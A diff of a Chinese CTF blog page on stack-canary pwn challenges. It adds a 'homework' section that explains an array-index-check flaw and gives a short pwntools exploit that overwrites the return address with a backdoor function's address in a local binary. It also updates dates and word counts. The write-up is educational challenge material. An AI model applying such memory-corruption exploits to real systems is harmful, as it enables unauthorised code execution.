@@ -382,14 +382,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-13
+                    2023-04-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    656
+                    783
                 </div>
                 
 
@@ -534,7 +534,8 @@ io<span class="token punctuation">.</span>send<span class="token punctuation">(<
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/2023/04/12/canary-jie-ti-pian/3-2.png"></p>
-<h1 id="bin3"><a href="#bin3" class="headerlink" title="bin3"></a>bin3</h1><ul>
+<h1 id="bin3"><a href="#bin3" class="headerlink" title="bin3"></a>bin3</h1><p>知识点：</p>
+<ul>
 <li>格式化字符串将__stack_chk_fail的got表项内容修改为后门函数</li>
 </ul>
 <p>程序存在格式化字符串漏洞，有后门函数，且只有一次输入输出机会。</p>
@@ -564,6 +565,36 @@ io<span class="token punctuation">.</span>send<span class="token punctuation">(<
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/2023/04/12/canary-jie-ti-pian/4-1.png"></p>
+<h1 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h1><p>知识点：</p>
+<ul>
+<li>数组下标越界(检查不严格)造成“任意地址”写</li>
+</ul>
+<p>程序开启了Canary和NX保护，存在如下漏洞：</p>
+<ul>
+<li>存在后门函数，数组下标检查不严格</li>
+</ul>
+<p>漏洞利用：</p>
+<ul>
+<li>计算出ret_addr相对于数组的下标（14），然后直接把后门函数写入</li>
+</ul>
+<p><img src="/2023/04/12/canary-jie-ti-pian/6.png"></p>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./homework'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'edit: '</span><span class="token punctuation">,</span> <span class="token string">'14'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'many? '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'call_me_maybe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'dump'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' &gt; '</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/04/12/canary-jie-ti-pian/6-1.png"></p>
 
                 
             </div>
@@ -770,8 +801,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PIE-%E7%BB%95%E8%BF%87/">
-                        <span class="chip bg-color">PIE`绕过`</span>
+                    <a href="/tags/PIE%E7%BB%95%E8%BF%87/">
+                        <span class="chip bg-color">PIE绕过</span>
                     </a>
                     
                     <a href="/tags/%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96/">
@@ -957,7 +988,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">23.4k</span>
+                        class="white-color">23.5k</span>
             
             
             
